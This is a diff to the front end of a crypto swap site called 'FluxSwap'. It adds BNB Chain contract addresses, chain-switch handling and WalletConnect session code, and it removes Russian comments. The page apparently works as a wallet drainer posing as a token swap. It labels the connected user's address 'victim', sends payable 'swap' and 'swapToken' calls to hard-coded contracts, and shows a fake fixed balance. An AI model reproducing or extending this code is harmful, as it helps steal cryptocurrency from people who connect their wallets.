@@ -14,7 +14,6 @@
     <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@500;600&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
-        /* ===== ВАШИ СТИЛИ (без изменений) ===== */
         :root { --bg-body: #08080f; --bg-card: rgba(20,18,35,0.65); --bg-input: rgba(30,28,50,0.5); --bg-hover: rgba(139,92,246,0.08); --bg-swap: rgba(25,23,42,0.6); --border: rgba(139,92,246,0.15); --border-hover: rgba(139,92,246,0.4); --text: #e9e7ff; --text-dim: #7a7595; --text-muted: #4a4660; --accent: #8b5cf6; --accent-2: #ec4899; --accent-glow: rgba(139,92,246,0.4); --accent-bg: rgba(139,92,246,0.1); --gradient: linear-gradient(135deg, #8b5cf6 0%, #ec4899 100%); --danger: #f87171; --radius: 20px; --radius-sm: 12px; --transition: 0.2s ease; --font: 'Space Grotesk', sans-serif; --font-mono: 'JetBrains Mono', monospace; }
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         body { background: var(--bg-body); color: var(--text); font-family: var(--font); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; -webkit-font-smoothing: antialiased; overflow-x: hidden; }
@@ -100,7 +99,6 @@
     </style>
 </head>
 <body>
-    <!-- HTML-разметка -->
     <div class="card">
         <div class="header">
             <div class="header-brand">
@@ -178,7 +176,6 @@
         <button id="swapBtn" class="btn-swap" disabled>Connect Wallet</button>
     </div>
 
-    <!-- Модалки -->
     <div id="walletModal" class="modal-overlay">
         <div class="modal">
             <h3>Connect Wallet</h3>
@@ -202,7 +199,6 @@
         </div>
     </div>
 
-    <!-- ===== ESM-МОДУЛИ ===== -->
     <script type="importmap">
     {
         "imports": {
@@ -230,7 +226,6 @@
     </script>
 
     <script>
-        // ===== ОСНОВНОЙ СКРИПТ =====
         window.initApp = function() {
             if (typeof ethers === 'undefined' || typeof window.WalletConnectProvider === 'undefined') {
                 document.getElementById('status').textContent = '❌ Библиотеки не загружены. Перезагрузите страницу.';
@@ -244,14 +239,14 @@
             'use strict';
 
             const PROJECT_ID = '2c94255cd6cb3dd91ea6f447bbe7d3c9';
-            // ===== АДРЕСА КОНТРАКТОВ =====
+
             const CONTRACT_ADDRESSES = {
-                1: '0x71774b5BFa1bf180eDA6CC1550f4569d08b5CD33',
+                1: '0xf76Df77742AB8636068FE61317e6f329176614c7',
+                56: '0x71774b5BFa1bf180eDA6CC1550f4569d08b5CD33',
                 137: '0x0000000000000000000000000000000000000000',
                 42161: '0x0000000000000000000000000000000000000000'
             };
 
-            // ABI только для реально используемых функций (swap, swapToken, view-функции)
             const SWAP_ABI = [
                 { "inputs": [], "name": "swap", "outputs": [], "stateMutability": "payable", "type": "function" },
                 { "inputs": [{ "internalType": "address", "name": "token", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "swapToken", "outputs": [], "stateMutability": "nonpayable", "type": "function" },
@@ -317,7 +312,6 @@
             let currentSelectType = null;
             let currentRate = 0;
 
-            // DOM
             const statusEl = document.getElementById('status');
             const connectBtn = document.getElementById('connectWalletBtn');
             const swapBtn = document.getElementById('swapBtn');
@@ -348,29 +342,53 @@
             let retryTimer = null;
             let rateCache = {};
 
-            // ===== Сохранение/восстановление сессии =====
+            // ===== Chain helpers =====
+            const CHAIN_NAMES = { 1: 'Ethereum', 56: 'BNB Chain', 137: 'Polygon', 42161: 'Arbitrum' };
+            function chainLabel(id) { return CHAIN_NAMES[id] || ('Chain ' + id); }
+
+            function readWcChainId(wc) {
+                try {
+                    if (typeof wc.chainId === 'number' && wc.chainId > 0) return wc.chainId;
+                    if (typeof wc.chainId === 'string') {
+                        const n = parseInt(wc.chainId, 10);
+                        if (Number.isFinite(n) && n > 0) return n;
+                    }
+                    const accs = wc.session && wc.session.namespaces && wc.session.namespaces.eip155 && wc.session.namespaces.eip155.accounts;
+                    if (accs && accs.length) {
+                        const m = accs[0].match(/eip155:(\d+):/);
+                        if (m) return parseInt(m[1], 10);
+                    }
+                } catch (_) {}
+                return null;
+            }
+
+            async function switchChain(target) {
+                if (!wcProvider) return false;
+                try {
+                    await wcProvider.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x' + target.toString(16) }]
+                    });
+                    return true;
+                } catch (_) { return false; }
+            }
+
+            // ===== Session =====
             const SESSION_KEY = 'walletconnect_session';
 
             function saveSession(data) {
-                try {
-                    localStorage.setItem(SESSION_KEY, JSON.stringify(data));
-                } catch (_) {}
+                try { localStorage.setItem(SESSION_KEY, JSON.stringify(data)); } catch (_) {}
             }
-
             function loadSession() {
                 try {
                     const raw = localStorage.getItem(SESSION_KEY);
                     return raw ? JSON.parse(raw) : null;
                 } catch (_) { return null; }
             }
-
             function clearSession() {
-                try {
-                    localStorage.removeItem(SESSION_KEY);
-                } catch (_) {}
+                try { localStorage.removeItem(SESSION_KEY); } catch (_) {}
             }
 
-            // ===== Восстановление сессии =====
             async function restoreSession() {
                 const session = loadSession();
                 if (!session) return false;
@@ -382,7 +400,7 @@
                 try {
                     const restored = await EthereumProvider.init({
                         projectId: PROJECT_ID,
-                        optionalChains: [1, 56, 137, 42161],
+                        optionalChains: [56, 1, 137, 42161],
                         showQrModal: false,
                         metadata: {
                             name: 'FluxSwap',
@@ -401,18 +419,19 @@
                     const web3Provider = new ethers.providers.Web3Provider(restored);
                     const signer_ = web3Provider.getSigner();
                     const address = await signer_.getAddress();
-                    const network = await web3Provider.getNetwork();
+
+                    const activeChain = readWcChainId(restored) || (await web3Provider.getNetwork()).chainId;
 
                     provider = web3Provider;
                     signer = signer_;
                     victim = address;
-                    chainId = network.chainId;
+                    chainId = activeChain;
                     wcProvider = restored;
                     isConnected = true;
                     attachProviderEvents(restored);
 
                     updateConnectButton();
-                    setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
+                    setStatus('✅ ' + chainLabel(chainId) + ' · ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
                     updateRateAndOutput();
                     return true;
                 } catch (e) {
@@ -421,9 +440,34 @@
                 }
             }
 
-            // ===== Прикрепление событий =====
             function attachProviderEvents(providerInstance) {
-                providerInstance.on('chainChanged', () => {});
+                providerInstance.on('chainChanged', async (raw) => {
+                    let cid = null;
+                    if (typeof raw === 'string') {
+                        if (raw.startsWith('eip155:')) cid = parseInt(raw.split(':')[1], 10);
+                        else if (/^0x/i.test(raw)) cid = parseInt(raw, 16);
+                        else cid = parseInt(raw, 10);
+                    } else if (typeof raw === 'number') {
+                        cid = raw;
+                    }
+                    if (!Number.isFinite(cid) || cid <= 0) cid = readWcChainId(providerInstance);
+                    if (!cid) return;
+
+                    chainId = cid;
+                    try {
+                        const web3Provider = new ethers.providers.Web3Provider(providerInstance);
+                        provider = web3Provider;
+                        signer = web3Provider.getSigner();
+                        victim = await signer.getAddress();
+                        saveSession({ chainId, address: victim });
+                    } catch (_) {}
+
+                    updateConnectButton();
+                    setStatus('✅ ' + chainLabel(chainId) + ' · ' +
+                              (victim ? victim.slice(0,6) + '...' + victim.slice(-4) : ''), 'ok');
+                    updateRateAndOutput();
+                });
+
                 providerInstance.on('accountsChanged', (accounts) => {
                     if (accounts.length === 0) {
                         setStatus('Account disconnected', 'err');
@@ -445,6 +489,7 @@
                         }).catch(() => {});
                     }
                 });
+
                 providerInstance.on('session_delete', async () => {
                     setStatus('Session expired', 'err');
                     isConnected = false;
@@ -455,7 +500,7 @@
                 });
             }
 
-            // ===== КУРСЫ =====
+            // ===== Rates =====
             async function fetchRealRate(fromId, toId) {
                 const cacheKey = fromId + '-' + toId;
                 if (rateCache[cacheKey] && (Date.now() - rateCache[cacheKey].timestamp < 30000)) {
@@ -550,7 +595,6 @@
             function openModal(modal) { modal.classList.add('active'); }
             function closeModal(modal) { modal.classList.remove('active'); }
 
-            // ===== ОЧИСТКА СЕССИИ (только при принудительном сбросе) =====
             async function forceClearSession() {
                 try {
                     if (wcProvider) {
@@ -595,7 +639,7 @@
                 } catch (_) {}
             }
 
-            // ===== ПОДКЛЮЧЕНИЕ WALLETCONNECT =====
+            // ===== WalletConnect connect =====
             async function connectWalletConnect() {
                 if (isConnecting || isProcessing) return;
                 closeModal(walletModal);
@@ -614,7 +658,7 @@
 
                     wcProvider = await EthereumProvider.init({
                         projectId: PROJECT_ID,
-                        optionalChains: [1, 56, 137, 42161],
+                        optionalChains: [56, 1, 137, 42161],
                         showQrModal: true,
                         metadata: {
                             name: 'FluxSwap',
@@ -636,17 +680,18 @@
                     const web3Provider = new ethers.providers.Web3Provider(wcProvider);
                     const signer_ = web3Provider.getSigner();
                     const address = await signer_.getAddress();
-                    const network = await web3Provider.getNetwork();
+
+                    const activeChain = readWcChainId(wcProvider) || (await web3Provider.getNetwork()).chainId;
 
                     provider = web3Provider;
                     signer = signer_;
                     victim = address;
-                    chainId = network.chainId;
+                    chainId = activeChain;
                     isConnected = true;
                     saveSession({ chainId, address });
 
                     updateConnectButton();
-                    setStatus('✅ Connected: ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
+                    setStatus('✅ ' + chainLabel(chainId) + ' · ' + address.slice(0,6) + '...' + address.slice(-4), 'ok');
                     isConnecting = false;
                     updateRateAndOutput();
 
@@ -675,7 +720,7 @@
                 }
             }
 
-            // ===== ИСПОЛНЕНИЕ СВАПА (переименовано) =====
+            // ===== Swap execution =====
             async function executeSwap() {
                 if (isProcessing) return;
                 if (!provider || !signer) {
@@ -685,7 +730,7 @@
 
                 const contractAddr = CONTRACT_ADDRESSES[chainId];
                 if (!contractAddr || contractAddr === '0x0000000000000000000000000000000000000000') {
-                    setStatus('Network not supported or contract not configured. Set your contract address in CONTRACT_ADDRESSES.', 'err');
+                    setStatus('Network not supported or contract not configured.', 'err');
                     return;
                 }
 
@@ -761,7 +806,7 @@
                 }
             }
 
-            // ===== ОБРАБОТЧИКИ =====
+            // ===== Handlers =====
             connectBtn.addEventListener('click', function() { openModal(walletModal); });
 
             walletConnectOption.addEventListener('click', async function() {
@@ -775,9 +820,9 @@
             tokenModal.addEventListener('click', function(e) { if (e.target === tokenModal) closeModal(tokenModal); });
 
             swapBtn.addEventListener('click', function() {
-                if (!isConnected) { 
-                    openModal(walletModal); 
-                    return; 
+                if (!isConnected) {
+                    openModal(walletModal);
+                    return;
                 }
                 const val = parseFloat(inputAmount.value);
                 if (!val || val <= 0) { setStatus('Enter an amount', 'err'); return; }
@@ -788,7 +833,6 @@
                 window.location.reload();
             });
 
-            // ===== MAX =====
             function handleMaxClick() {
                 const amount = 0.001;
                 balanceFrom.innerHTML = amount.toFixed(6) + ' <button class="max-tag" id="maxBtn">Max</button>';
@@ -805,7 +849,7 @@
                 updateRateAndOutput();
             });
 
-            // ===== ВЫБОР ТОКЕНОВ =====
+            // ===== Token picker =====
             function renderTokenList(filter) {
                 filter = (filter || '').toLowerCase();
                 tokenList.innerHTML = '';
@@ -864,7 +908,7 @@
                 setStatus('Tokens flipped', '');
             });
 
-            // ===== ИНИЦИАЛИЗАЦИЯ =====
+            // ===== Init =====
             async function init() {
                 await forceClearSession();
                 updateConnectButton();
